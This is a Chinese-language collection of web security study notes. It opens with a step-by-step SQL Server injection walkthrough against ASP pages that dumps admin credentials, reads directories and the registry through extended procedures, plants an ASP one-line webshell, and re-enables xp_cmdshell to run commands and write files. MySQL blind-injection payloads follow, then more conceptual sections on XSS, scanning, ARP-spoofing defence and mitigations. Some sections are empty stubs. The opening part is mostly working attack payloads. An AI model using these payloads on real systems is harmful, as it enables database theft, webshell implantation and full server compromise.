news_show.asp?id=15618 And char(124)+(Select Top 1 cast([name] as varchar(8000)) from(Select Top 2 dbid,name from [master]..[sysdatabases] order by [dbid]) T order by [dbid] desc)&gt;0

news_show.asp?id=15618 And (Select Top 1 cast([name] as nvarchar(4000))%2Bchar(124) from(Select Top 16 dbid,name from [master].[dbo].[sysdatabases] order by [dbid]) T order by [dbid] desc)&gt;0

先列出上面UrlEncode的字符

%2B - &amp;apos;+&amp;apos;

%3E - &amp;apos;&gt;&amp;apos;

%20 - &amp;apos; &amp;apos;

%2F - &amp;apos;/&amp;apos;

我只能说这些sql语句构造得是相当的巧妙啊，我开始纳闷了，为啥非要用子查询呢。于是我直接用

Select Top X dbid,name from [master].[dbo].[sysdatabases] order by [dbid]

当X为1,也就是返回第一个的时候，是没有问题的，返回了master,但是X为2的时候就出现错误：

&quot;子查询返回的值多于一个。当子查询跟随在 =、!=、&lt;、&lt;=、&gt;、&gt;= 之后，或子查询用作表达式时，这种情况是不允许的。&quot;

这个时候子查询就起到了关键作用。还有开始不知道T是啥玩意，后来才知道sqlserver子查询必须要起一个别名,T就是那个别名，然后把查询的语句继续和0比较报错 这样就暴出了所有的数据库名。

第一个select count(1)返回数据库数量。

接下来是猜解表名，假设我们当前的数据库是news，那么首先猜解数据库的表的数量：

news_show.asp?id=15618 And (Select char(124)+Cast(Count(1) as varchar(8000))+char(124) From news..sysobjects where xtype=0×55)&gt;0

xtype的为数据表类型，0×55就是U,就是用户表。其他的参见这里有详细的解释。

然后分别列出表名：

news_show.asp?id=15618 And (Select Top 1 cast(name as nvarchar(4000)) from (Select Top 1 id,name from [news]..[sysobjects] Where xtype=0×55 order by id) T order by id desc)&gt;0

修改第二个Top 1为1到表数就可以了。

然后是猜解列名，假设要猜解的表为Admin，首先得到表在sysobjects中存储的唯一id：

news_show.asp?id=15618 And (Select Top 1 cast(id as nvarchar(20)) from [news].[dbo].[sysobjects] where name=&amp;apos;Admin&amp;apos;)&gt;0

猜解表名，id就是上面查询出来Admin表的id。

news_show.asp?id=15618 And (Select Top 1 cast(name as nvarchar(4000))+char(124) from (Select Top 1 colid,name From [news].[dbo].[syscolumns] Where id = 1993058136 Order by colid) T Order by colid desc)&gt;0

假设猜解出来的列名有id,AdminName,AdminPassword,AdminPower,Userid,ct

假设只猜解AdminName和AdminPassword的值

首先查看Admin表有多少条记录：

news_show.asp?id=15618 And (Select Cast(Count([AdminName]) as nvarchar(4000))+char(124) From [news]..[Admin] Where 1=1)&gt;0

返回第一列数据：

news_show.asp?id=15618 And (Select Top 1 isNull(cast([AdminName] as nvarchar(4000)),char(32)) char(124) isNull(cast([AdminPassword] as nvarchar(4000)),char(32)) From (Select Top 1 [AdminName],[AdminPassword] From [news]..[Admin] Where 1=1 Order by [AdminName]) T Order by [AdminName] Desc)&gt;0

isNull是判定数据是否为空，为空就返回后面那个char(32)的值也就是空格-&gt;&amp;apos; &amp;apos; 。

后面的以此类推。

【读取目录--xp_dirtree】

drop掉表，然后在当前数据库创建一个表，有三个字段subdirectory,depth,file

Board.asp?id=494;DROP TABLE techguru;CREATE TABLE techguru(subdirectory nvarchar(400) NULL,depth tinyint NULL,[file] bit NULL)-

清空表的数据，然后把xp_dirtree存储过程的结果存入techguru表,xp_dirtree第一个参数是路径，第二个是深度，为0时无限递归，第三个是文件类型，1为文件夹和文件，0为只显示文件夹。

Board.asp?id=494;DELETE techguru;Insert techguru exec master..xp_dirtree &amp;apos;c:\&amp;apos;,1,1-

开始一个一个的抓取文件，目录名字，每次增加第二个top后面的数

Board.asp?id=494 And (Select Top 1 cast([subdirectory] as nvarchar(400))%2Bchar(124)%2Bcast([file] as nvarchar(1))%2Bchar(124) From(Select Top 1 [subdirectory],[file] From techguru ORDER BY [file],[subdirectory]) T ORDER BY [file] desc,[subdirectory] desc)=0

移除表：

Board.asp?id=494;DROP TABLE techguru-

【读取注册表--xp_regread】

首先建立一个表，有两列Value和Data

Board.asp?id=494;DROP TABLE [techguru];CREATE TABLE [techguru](Value nvarchar(4000) NULL,Data nvarchar(4000) NULL)-

执行xp_regread写入刚建立的表

Board.asp?id=494;DELETE [techguru];Insert [techguru] exec master.dbo.xp_regread &amp;apos;HKEY_LOCAL_MACHINE&amp;apos;,&amp;apos;SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots&amp;apos;,&amp;apos;/&amp;apos;-

读出来

Board.asp?id=494 And (Select Top 1 cast([Data] as nvarchar(4000))%2Bchar(124) From [techguru] order by [Data] desc)=0

删表

Board.asp?id=494;DROP TABLE [techguru]-

【上传webshell--backup log xx to disk】

备份log,截断1，截断2

第 一 步:建立存一句话木马的表

Board.asp?id=494;create table [dbo].[shit_tmp] ([cmd] [image])-

第 二 步：0×7900690061006F006C007500是&amp;apos;yiaolu&amp;apos;的sql编码

Board.asp?id=494;declare @a sysname,@s nvarchar(4000) select @a=db_name

(),@s=0×7900690061006F006C007500 backup log @a to disk = @s with init,no_truncate-

第 三 步：0×3C25657865637574652872657175657374282261222929253E是&lt;%execute(request(&quot;a&quot;))%&gt;的hex。

Board.asp?id=494;insert into [shit_tmp](cmd) values

(0×3C25657865637574652872657175657374282261222929253E)-

第 四 步0×64003A005C003100320033002E00610073007000是d:\123.asp的sql编码

Board.asp?id=494;declare @a sysname,@s nvarchar(4000) select @a=db_name

(),@s=0×64003A005C003100320033002E00610073007000 backup log @a to disk=@s with init,no_truncate-

第 五 步

Board.asp?id=494;Drop table [shit_tmp]-

【执行命令】

;CREATE TABLE [X_2894]([id] int NOT NULL IDENTITY (1,1), [ResultTxt] nvarchar(4000) NULL);

insert into [X_2894](ResultTxt) exec master.dbo.xp_cmdshell &amp;apos;Dir C:\&amp;apos;;

insert into [X_2894] values (&amp;apos;g_over&amp;apos;);exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

And (Select Top 1 CASE WHEN ResultTxt is Null then char(124) else ResultTxt+char(124) End from (Select Top 1 id,ResultTxt from [X_2894] order by [id]) T order by [id] desc)&gt;0

……

And (Select Top 1 CASE WHEN ResultTxt is Null then char(124) else ResultTxt+char(124) End from (Select Top 23 id,ResultTxt from [X_2894] order by [id]) T order by [id] desc)&gt;0

g_over这个是专门插入用来作为命令回显结束的标志。

;DROP TABLE [X_2894];-

【本地文件上传】

假设上传到服务器c:\down.vbs位置

;exec master.dbo.xp_cmdshell &amp;apos;del C:\down.vbs&amp;apos;-

;exec master.dbo.xp_cmdshell &amp;apos;ecHo [DeleteOnCopy] &gt;&gt; C:\down.vbs&amp;apos;;exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

;exec master.dbo.xp_cmdshell &amp;apos;ecHo Owner=Administrator &gt;&gt; C:\down.vbs&amp;apos;;exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

;exec master.dbo.xp_cmdshell &amp;apos;ecHo Personalized=5 &gt;&gt; C:\down.vbs&amp;apos;;exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

;exec master.dbo.xp_cmdshell &amp;apos;ecHo PersonalizedName=My Documents &gt;&gt; C:\down.vbs&amp;apos;;exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

总结来说就是调用xp_cmdshell执行echo 一句句的写入文件。

这次分析算是告一段落，不过还有mysql,access,oracle,db2,infomix……….等待探索。

#### SQL inject Mysql {#sql-inject-mysql}

盲注：

1.boolenBased

1.1\.        1&amp;apos; and 1=1 and left(vserion{},1)=5 and &amp;apos;1&amp;apos;=&amp;apos;1        #数据库版本猜解

1.2\.        1&amp;apos; and 1=1 and length(database[])=4 and &amp;apos;1&amp;apos;=&amp;apos;1     #数据库名的长度猜解

1.3\.        1&amp;apos; and 1=1 and left(database[],1=&amp;apos;a&amp;apos; and &amp;apos;1&amp;apos;=&amp;apos;1       #数据库名猜解

2.timeBased

3.ErrotBased

#### Untitled {#untitled}

order by  猜返回列数

### XSS {#xss}

跨站脚本攻击是通过在网页中加入恶意代码，当访问者浏览网页时恶意代码会被执行或者通过给管理员发信息的方式诱使管理员浏览，从而获得管理员权限，控制整个网站。攻击者利用跨站请求伪造能够轻松地强迫用户的浏览器发出非故意的HTTP请求，如诈骗性的电汇请求、修改口令和下载非法的内容等请求。

跨站脚本攻击过程

相关链接：

[http://www.51testing.com/html/36/n-142136.html](http://www.51testing.com/html/36/n-142136.html)   XSS简单渗透测试

[http://www.51testing.com/html/71/n-201571.html](http://www.51testing.com/html/71/n-201571.html)   如何防范XSS跨站脚本攻击--测试篇

[http://www.51testing.com/html/04/n-90004.html](http://www.51testing.com/html/04/n-90004.html)      跨站脚本执行漏洞详解

1.非固定式 XSS 攻击 (Non-persistent)

       这是最常见的攻击类型，日前好几次大规模 XSS 攻击事件都是此类攻击。

       没经验的开发人员最容易遭受此类型的 XSS 攻击。

       像 Request, Request.Form, Request.QueryString, Request.Cookie, Request.Headers 等等都是常见的攻击来源。

2.固定式 XSS 攻击 (Persistent)又称 Stored-XSS 攻击。

       黑客会试图将「攻击 XSS 字符串」透过各种管道写入到目标网站的数据库中，让浏览网站的用户下载病毒、执行特定脚本、当成 DDoS 的跳板、…等等。

3.以 DOM 为基础的 XSS 攻击 (DOM-based)

       3.1此类型会利用网页透过 JavaScript 动态显示信息到页面中（透过 DOM 修改内容），但内容并未透过 HtmlEncode 过，导致遭黑客传入恶意脚本(JavaScript或VBScript)并让使用者遭殃，或试图修改原有网页中的信息用以欺骗用户执行特定动作或进行信息诈骗。

       3.2另一种是透过 Browser 的漏洞将 JavaScript 先写入本机计算机，然后在透过被 XSS 攻击过的网页加载本机 JavaScript 档案进行本机计算机的攻击，例如植入病毒或木马之类的程序

### Scan {#scan}

通常扫描包括端口扫描和漏洞扫描

1、端口扫描

通常分为TCP 和UDP扫描、标识扫描、FTP 反弹扫描、源端口扫描；

TCP 和UDP扫描

TCP连接扫描：是完整的TCP全开放扫描（ 囊括了SYN、SYN/ack、ack），缺点是很容易被对方的防火墙、入侵检测设备截杀，得不到真实的端口开放情况。简单的说TCP连接扫描通常是在渗透到内网后，进行内网主机端口开放情况的扫描。这与直接在外网扫描时得到的结果差别很大。

TCP SYN扫描：俗称为半开放扫描，因为它们都是只建立到目标主机的TCP半开放连接（单个SYN包）；如果探测到目标系统上的端口是开放的，则返回SYN/ack包；如果端口关闭，目标主机返回 rst/ack包

TCP FIN扫描：向目标主机端口发出单个的FIN包，如果端口关闭，目标系统将返回rst包。

TCP Xmas树扫描：向目标主机端口发送具有fin、urg和push TCP标志的包，若目标系统所有端口关闭，则返回rst包。

TCP 空扫描：关掉所有的标志，如果目标系统所有端口关闭，则返回rst包

TCP ACK 扫描：这个扫描可以用于确定防火墙的规则集，或者使单个包穿过简单的包过滤防火墙。经过一些测试，在构造一些畸形包的时候，国内大多的防火墙都未进行过滤分析，都是直接放行。策略完善的防火墙将拒绝那些与防火墙状态表中的会话不相符合的ack响应包；而简单的包过滤防火墙将允许ack连接请求。

TCP rpc扫描 ：主要用于识别远程过程调用（rpc）端口及相关程序和版本号。

UDP扫描：主要扫描一些目标主机的UDP端口扫描情况。

看一个示例：

220 mail.xxxx.com  esmtp  sendmail 8.8.3; mon,12  aug 06:05:53 -0500

通过这个扫描信息，我们可以完整的推断出这是台邮件服务器，是一台sendmail8.8.3的邮件服务器，并且支持扩展smtp（esmtp）命令，我们可以通过telnet会话来向服务器发送特定的命令完成交换，从而确定 smtp/esmtp所支持的命令。

利用TCP 和UDP扫描，可以获得目标系统运行的软件和版本信息。

FTP反弹扫描

主要是利用了FTP协议中对代理FTP这一特性，对FTP服务器进行欺骗扫描。FTP服务器作为反弹代理，黑客能够进行掩饰源扫描地址的端口扫描（通俗的理解就是让FTP服务器做&quot;代理&quot;将一组字符发到特定服务器的ip地址和端口）。需要注意的是，如果要执行FTP反弹扫描，中间FTP服务器必须提供一个可读写的目录。

源端口扫描

主要是通过扫描dns、smtp、http这些默认端口，来判断其打开情况。

可使用的工具，个人推荐 supercan，目前最高版本是4.0的，并且集成了whois查询等实用功能。nmap 目前也出了win下的，但是得在本机安装的有active perl，具体的我也没有在windows环境下使用过，都是在linux下使用的。还有x-scan，国产的精品。这些都可以在网络上免费下载到。

2、漏洞扫描

漏洞扫描主要是利用漏洞扫描工具对一组目标ip进行扫描，通过扫描能得到大量相关的ip、服务、操作系统和应用程序的漏洞信息。漏洞扫描可分为系统漏洞扫描和web漏洞扫描

主要扫描一些操作系统或应用程序配置漏洞，如：

◆操作系统或应用程序代码漏洞

◆旧的或作废的软件版本

◆特络绎木马或后门程序

◆致命的特权相关的漏洞

◆拒绝服务漏洞

◆web和cgi漏洞

漏洞库信息对于漏洞扫描有很多帮助，它的来源主要是iss的x-force 漏洞库，安全焦点的bugtraq数据库、http：//cve.mitre.org上维护的cve列表。

漏洞扫描推荐工具：启明的天镜漏洞扫描系列和web漏洞扫描的Acunetix.Web.Vulnerability.Scanner4

### udp Sscn {#udp-sscn}

水平扫描是对多个不同目的主机的同一个端口进行扫描.

垂直扫描是对特定目的主机的多个端口进行扫描。

块扫描是水平扫描和垂直扫描的结合，是对多个不同目的主机的多个端口进行扫描。

vertical/horizintal

### ARP Attack {#arp-attack}

[http://netsecurity.51cto.com/secu/51cto-salon-14/](http://netsecurity.51cto.com/secu/51cto-salon-14/)

[http://netsecurity.51cto.com/art/200609/31897.htm](http://netsecurity.51cto.com/art/200609/31897.htm)

#### 防范ARP病毒攻击 {#arp}

有时，局域网内大家突然都不可以上网，使用抓包工具可以发现有个别机器在不停的发送arp广播包。这种情况一般都是内网的某台机器中了arp病毒，然后这台机器便不断的发送欺骗包给所有机器来冒充网关，这样其他机器就会把这个中毒的机器当作网关而把数据包发给它，而它在接到数据包后又没有转发数据包到真正的网关去，所以造成大家都无法上网。

一般的，arp病毒使用欺骗的手段是为了窃听内网中所有的通信数据以达到它的某种目的。

由于一般的arp病毒在发送欺骗包时会修改自身的mac地址，这使我们在快速排查中毒机器有一定困难。但这可以通过mac与ip绑定的方式解决，即所有内网机器的ip都通与mac绑定的方式分配，这样所有未登记的不合法mac就无法连接到内网了。

如果局域网内已经有网关欺骗而导致无法上网时，我们还可以通过在本机上绑定网关的mac地址和ip来解决欺骗问题。但此步需要一个条件，即你要知道真实的网关ip和mac地址。操作如下：

防范arp病毒攻击方法一：(此方法对Linux和windows都适用)

列出局域网内所有机器的mac地址,如果此步列出的路由表中网关ip 和网关mac地址与真实不符，就也证明你已经被网关欺骗了。

# arp -a

绑定mac地址

# arp -s 192.168.1.1 00:07:E9:xx:xx:xx

注意：这里192.168.1.1有可能有换成hostname，假如你的网关设置了hostname的话。

防范arp病毒攻击方法二：(适用于linux)

创建一个/etc/ethers文件，比如你要绑定网关，那就在/etc/ethers里写上：

192.168.1.1 00:07:E9:xx:xx:xx

然后执行

# arp -f

操作完成你可以使用arp -a查看当前的arp缓存表，如果列表显示正确，那么你的绑定操作已成功，如果还有绑定其它机器的话，比如ftp等，那就继续添加记录。

说明：此处的192.168.1.1为你的网关地址，00:07:E9:xx:xx:xx为你的网关mac地址。

注意：Linux和Widows上的MAC地址格式不同。Linux表示为：AA:AA:AA:AA:AA:AA，Windows表示为：AA-AA-AA-AA-AA-AA。每次重启机器后需要重新绑定mac地址，你可以写一个自动脚本后加到自启动项目中。

另外，mac地址的绑定需要双向的，即机器a绑定了机器b，机器b也要绑定机器a，这样防范arp病毒攻击才会有效。

防范arp病毒攻击的方法有很多，本文知识介绍了比较实用的两种，而且是针对linux和windows两种不同系统的办法，所以使用时一定要看清系统，对症下药。

### Buffer Overflow {#buffer-overflow}

[http://netsecurity.51cto.com/art/201111/302310.htm](http://netsecurity.51cto.com/art/201111/302310.htm)

### Http response splitting attack {#http-response-splitting-attack}

### Fuzz Test {#fuzz-test}

### Image Hijack {#image-hijack}

**映像劫持**

就是 Image File Execution Options （其实应该称为 &quot;Image Hijack&quot; 。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有 [\\t &quot;_blank&quot;](http://baike.baidu.com/view/315045.htm) 管理员 和 local system 有权读写修改。

**windows** **映像劫持技术**

　　 **（** **IFEO** **）**

**基本症状**

　 　可能有朋友遇到过这样的情况，一个正常的程序，无论把它放在哪个位置，或者是一个程序重新用安装盘修复过，都出现无法运行的情况，或是出错提示为 &quot; 找不 到文件 &quot; 或者直接没有运行起来的反应，或者是比如运行程序 A 却成了执行 B （可能是病毒），而改名后却可以正常运行的现象。

**遭遇病毒**

　　遭遇流行 &quot; 映像劫持 &quot; 病毒的系统表现为常见的 [\\t &quot;_blank&quot;](http://baike.baidu.com/view/33433.htm) 杀毒软件 、 [\\t &quot;_blank&quot;](http://baike.baidu.com/view/3067.htm)

### buffer overflow {#buffer-overflow-0}

缓冲区溢出

### note {#note}

Web 应用是指采用B/S架构、通过HTTP/HTTPS协议提供服务的统称。随着互联网的广泛使用，Web应用已经融入到日常生活中的各个方面：网上购物、网络银行应用、证券股票交易、政府行政审批等等。在这些Web访问中，大多数应用不是静态的网页浏览，而是涉及到服务器侧的动态处理。此时，如果Java、PHP、ASP等程序语言的编程人员的安全意识不足，对程序参数输入等检查不严格等，会导致Web应用安全问题层出不穷。

本文根据当前Web应用的安全情况，列举了Web应用程序常见的攻击原理及危害，并给出如何避免遭受Web攻击的建议。    

1  Web应用漏洞原理

Web应用攻击是攻击者通过浏览器或攻击工具，在URL或者其它输入区域（如表单等），向Web服务器发送特殊请求，从中发现Web应用程序存在的漏洞，从而进一步操纵和控制网站，查看、修改未授权的信息。

1.1  Web应用的漏洞分类

1、信息泄露漏洞

信息泄露漏洞是由于Web服务器或应用程序没有正确处理一些特殊请求，泄露Web服务器的一些敏感信息，如用户名、密码、源代码、服务器信息、配置信息等。

造成信息泄露主要有以下三种原因：

    Web服务器配置存在问题，导致一些系统文件或者配置文件暴露在互联网中；

    Web服务器本身存在漏洞，在浏览器中输入一些特殊的字符，可以访问未授权的文件或者动态脚本文件源码；

    Web网站的程序编写存在问题，对用户提交请求没有进行适当的过滤，直接使用用户提交上来的数据。

2、目录遍历漏洞

目录遍历漏洞是攻击者向Web服务器发送请求，通过在URL中或在有特殊意义的目录中附加&quot;../&quot;、或者附加&quot;../&quot;的一些变形（如&quot;..\&quot;或&quot;..//&quot;甚至其编码），导致攻击者能够访问未授权的目录，以及在Web服务器的根目录以外执行命令。

3、命令执行漏洞

命令执行漏洞是通过URL发起请求，在Web服务器端执行未授权的命令，获取系统信息，篡改系统配置，控制整个系统，使系统瘫痪等。

命令执行漏洞主要有两种情况：

   通过目录遍历漏洞，访问系统文件夹，执行指定的系统命令；

   攻击者提交特殊的字符或者命令，Web程序没有进行检测或者绕过Web应用程序过滤，把用户提交的请求作为指令进行解析，导致执行任意命令。

4、文件包含漏洞

文件包含漏洞是由攻击者向Web服务器发送请求时，在URL添加非法参数，Web服务器端程序变量过滤不严，把非法的文件名作为参数处理。这些非法的文件名可以是服务器本地的某个文件，也可以是远端的某个恶意文件。由于这种漏洞是由PHP变量过滤不严导致的，所以只有基于PHP开发的Web应用程序才有可能存在文件包含漏洞。

5、SQL注入漏洞

SQL注入漏洞是由于Web应用程序没有对用户输入数据的合法性进行判断，攻击者通过Web页面的输入区域(如URL、表单等) ，用精心构造的SQL语句插入特殊字符和指令，通过和数据库交互获得私密信息或者篡改数据库信息。SQL注入攻击在Web攻击中非常流行，攻击者可以利用SQL注入漏洞获得管理员权限，在网页上加挂木马和各种恶意程序，盗取企业和用户敏感信息。

6、跨站脚本漏洞

跨站脚本漏洞是因为Web应用程序时没有对用户提交的语句和变量进行过滤或限制，攻击者通过Web页面的输入区域向数据库或HTML页面中提交恶意代码，当用户打开有恶意代码的链接或页面时，恶意代码通过浏览器自动执行，从而达到攻击的目的。跨站脚本漏洞危害很大，尤其是目前被广泛使用的网络银行，通过跨站脚本漏洞攻击者可以冒充受害者访问用户重要账户，盗窃企业重要信息。

根据前期各个漏洞研究机构的调查显示，SQL注入漏洞和跨站脚本漏洞的普遍程度排名前两位，造成的危害也更加巨大。

1.2   SQL注入攻击原理

SQL注入攻击是通过构造巧妙的SQL语句，同网页提交的内容结合起来进行注入攻击。比较常用的手段有使用注释符号、恒等式（如1＝1）、使用union语句进行联合查询、使用insert或update语句插入或修改数据等，此外还可以利用一些内置函数辅助攻击。

通过SQL注入漏洞攻击网站的步骤一般如下：

第一步：探测网站是否存在SQL注入漏洞。

第二步：探测后台数据库的类型。

第三步：根据后台数据库的类型，探测系统表的信息。

第四步：探测存在的表信息。

第五步：探测表中存在的列信息。

第六步：探测表中的数据信息。

1.3  跨站脚本攻击原理

跨站脚本攻击的目的是盗走客户端敏感信息,冒充受害者访问用户的重要账户。跨站脚本攻击主要有以下三种形式：

1、本地跨站脚本攻击

B给A发送一个恶意构造的Web URL，A点击查看了这个URL，并将该页面保存到本地硬盘（或B构造的网页中存在这样的功能）。A在本地运行该网页，网页中嵌入的恶意脚本可以A电脑上执行A持有的权限下的所有命令。

2、反射跨站脚本攻击

A经常浏览某个网站，此网站为B所拥有。A使用用户名/密码登录B网站，B网站存储下A的敏感信息（如银行帐户信息等）。C发现B的站点包含反射跨站脚本漏洞，编写一个利用漏洞的URL，域名为B网站，在URL后面嵌入了恶意脚本（如获取A的cookie文件），并通过邮件或社会工程学等方式欺骗A访问存在恶意的URL。当A使用C提供的URL访问B网站时，由于B网站存在反射跨站脚本漏洞，嵌入到URL中的恶意脚本通过Web服务器返回给A，并在A浏览器中执行，A的敏感信息在完全不知情的情况下将发送给了C。

3、持久跨站脚本攻击

B拥有一个Web站点，该站点允许用户发布和浏览已发布的信息。C注意到B的站点具有持久跨站脚本漏洞，C发布一个热点信息，吸引用户阅读。A一旦浏览该信息，其会话cookies或者其它信息将被C盗走。持久性跨站脚本攻击一般出现在论坛、留言簿等网页，攻击者通过留言，将攻击数据写入服务器数据库中，浏览该留言的用户的信息都会被泄漏。

2   Web应用漏洞的防御实现

对于以上常见的Web应用漏洞漏洞，可以从如下几个方面入手进行防御：

1)对 Web应用开发者而言

大部分Web应用常见漏洞，都是在Web应用开发中，开发者没有对用户输入的参数进行检测或者检测不严格造成的。所以，Web应用开发者应该树立很强的安全意识，开发中编写安全代码；对用户提交的URL、查询关键字、HTTP头、POST数据等进行严格的检测和限制，只接受一定长度范围内、采用适当格式及编码的字符，阻塞、过滤或者忽略其它的任何字符。通过编写安全的Web应用代码，可以消除绝大部分的Web应用安全问题。

2) 对Web网站管理员而言

作为负责网站日常维护管理工作Web管理员，应该及时跟踪并安装最新的、支撑Web网站运行的各种软件的安全补丁，确保攻击者无法通过软件漏洞对网站进行攻击。除了软件本身的漏洞外，Web服务器、数据库等不正确的配置也可能导致Web应用安全问题。Web网站管理员应该对网站各种软件配置进行仔细检测，降低安全问题的出现可能。此外，Web管理员还应该定期审计Web服务器日志，检测是否存在异常访问，及早发现潜在的安全问题。

3）使用网络防攻击设备

前两种为事前预防方式，是比较理想化的情况。然而在现实中，Web应用系统的漏洞还是不可避免的存在：部分Web网站已经存在大量的安全漏洞，而Web开发者和网站管理员并没有意识到或发现这些安全漏洞。由于Web应用是采用HTTP协议，普通的防火墙设备无法对Web类攻击进行防御，因此可以使用IPS入侵防御设备来实现安全防护。

++++++++++++++++++++++++++++++

Never trust data from the browser under any circumstances.

从不要相信来自浏览器端的数据。（因为你永远不可能知道在浏览器进行数据操作是你的用户还是正在寻找攻击漏洞的黑客）。

安全性问题包括的内容：

SQL injection is a common exploit in which an attacker alters Web page parameters (such as GET/POST data or URLs) to insert arbitrary SQL snippets that a na?ve Web application executes in its database directly.

SQL Injection（SQL注入）：SQL注入是最常见的攻击方式，它的主要原理是：攻击者通过改变WEB页的参数（如GET/POST数据或是URLS）直接将SQL片段提交到服务器，并在服务器端执行的过程。

Cross-Site scripting (XSS) is found in web applications that fail to escape user-submitted content properly before rendering it into HTML. This allows an attacker to insert arbitrary HTML into your Web page, usually in the form of &lt;script&gt; tags.

Attackers often use XSS attacks to steal cookie and session information, or to trick users into giving private information to the wrong person.

Cross-Site scripting (XSS)(跨站点脚本攻击)：XSS定义：是由于WEB程序没有对用户提交的HTML内容进行适当的转义，这样攻击者就可能在你的WEB页中插入一些HTML语句，这些语句通过以&lt;script&gt;标识符的形式出现。

攻击者通常使用XSS攻击来窃取cookie和session信息，或是欺骗用户将隐私信息暴露给错误对象（又称为钓鱼）。

Directory traversal is another injection-style attack, where in a malicious user tricks file system code reading and/or writing files that the Web server shouldn&amp;apos;t have access to.

Directory Traversal（目录遍历）：目录遍历是另一种注入类型的攻击，攻击者欺骗文件系统读或写服务器不允许操作的文件。

During development, being able to see trace backs and errors live in your browser is extremely useful. However, if these errors get displayed once the site goes live, they can reveal aspects of your code configuration that could aid an attacker.

Exposed Error Messages（暴露错误信息）：开发过程中，如果可以看到错误或历史纪录对FIX问题是非常有用的。但是如果这些错误信息被攻击者所获取，那么攻击者就可以通过错误信息而了解到应用程序代码或是数据库或是配置等方面的内容，并为其进行攻击提供有力的帮助。

漏洞扫描：

安全漏洞扫描通常是借助于特定的漏洞扫描器完成的。漏洞扫描器是一种自动检测远程或本地主机安全性弱点的程序。通过使用漏洞扫描器，系统管理员能够发现所维护信息系统存在的安全漏洞，及时修补漏洞。

按常规标准，可以将漏洞扫描分为两种类型：主机漏洞扫描（Host Scanner）和网络漏洞扫描器（Net Scanner）。

主机漏洞扫描器是指在本地运行检测系统漏洞的程序，如著名的COPS、Tripewire、Tiger等自由软件。

网络漏洞扫描器是指基于网络远程检测目标网络和主机系统漏洞的程序，如Satan、ISS、Internet Scanner等。

安全漏洞扫描可以用于日常安全防护，同时可以作为对软件产品或信息系统进行测试的手段，可以在安全漏洞造成严重危害前，发现漏洞并加以防范。

+++++

[http://www.51testing.com/html/16/n-172816.html](http://www.51testing.com/html/16/n-172816.html) Web安全渗透测试之信息搜集篇（上）

[http://www.51testing.com/html/21/n-172821.html](http://www.51testing.com/html/21/n-172821.html) Web安全渗透测试之信息搜集篇（下）

[http://www.51testing.com/html/16/n-235616.html](http://www.51testing.com/html/16/n-235616.html)  渗透测试技术与模型研究